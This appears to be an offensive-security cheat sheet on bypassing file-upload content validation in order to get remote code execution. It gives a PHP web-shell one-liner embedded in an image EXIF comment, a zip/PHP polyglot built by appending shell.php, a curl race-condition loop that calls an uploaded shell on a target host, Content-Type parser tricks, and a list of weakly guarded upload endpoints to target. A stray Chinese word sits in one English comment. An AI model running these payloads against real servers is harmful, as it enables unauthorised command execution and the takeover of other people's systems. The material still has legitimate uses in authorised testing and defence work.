# File Upload - Content/Deep Validation Bypass

## When Server Validates File Content (not just extension/MIME)

### Image Re-encoding Survival
If the server uses GD/Imagick to resize/re-encode uploads, simple appended payloads are stripped. Need pixel-level embedding.

### LSB Steganography Payload (survives some re-encoding, complex to trigger execution)
```python
from PIL import Image
img = Image.open('clean.png')
payload = b'<?php system($_GET["c"]); ?>'
# Embed in LSB - requires custom PHP LFI/include gadget to execute, rarely直接 useful for upload RCE
```

### GD Library Specific Bypass (older PHP GD versions)
```bash
# Some GD versions don't strip all metadata comments
exiftool -Comment='<?php system($_GET["c"]);?>' shell.png
```

## Archive-Based Content Validation Bypass

### Zip Slip Combined with Content Check
```
If server only validates the outer zip's MIME/magic bytes,
but extracts contents without validating each file inside,
embed webshell inside the zip.
```

### Valid Zip with PHP Extension
```bash
# Some frameworks accept .zip that's actually a valid PHP polyglot
cat shell.php >> valid.zip
mv valid.zip shell.php
```

## Server-Side Validation Logic Bypass

### Race Condition (TOCTOU)
```bash
# If file is uploaded then validated then deleted if invalid
# Race to access file between upload and validation/deletion
for i in {1..100}; do
    curl -s http://target.com/uploads/shell.php?c=id &
done
# Run simultaneously with upload request
```

### Case-Sensitivity in Content-Type Validation
```
Content-Type: Image/JPEG    # Some validators are case-sensitive
Content-Type: image/jpeg;charset=utf-8   # Extra params may confuse parser
```

### Content-Length Mismatch Exploitation
```
# Some validators only check first N bytes for magic number
# Then process entire file as PHP if extension matches
# Craft: [valid magic bytes][padding][PHP payload]
```

## Rename After Upload Race Condition
```bash
# If app: 1) uploads to temp name 2) validates 3) renames to final safe name
# Access temp file before step 3 completes
# Requires knowing/guessing temp naming pattern (often predictable: timestamp, random)
```

## Bypass via Different Upload Endpoints
```
# Same app may have multiple upload endpoints with different validation
/upload/avatar          # Strict validation
/upload/document        # Weaker validation
/api/v1/upload           # May be less protected than /upload
/admin/import            # Internal endpoints often skip validation
```

## Testing Checklist
```
1. Determine if content is re-encoded (upload image, download it back, diff bytes)
2. If re-encoded: pixel-based payload is impractical for direct RCE; look for other vectors (LFI chain)
3. Test race conditions around upload-validate-delete window
4. Enumerate all upload endpoints in the application, test weakest one
5. Check Content-Length/Content-Type parser edge cases
```
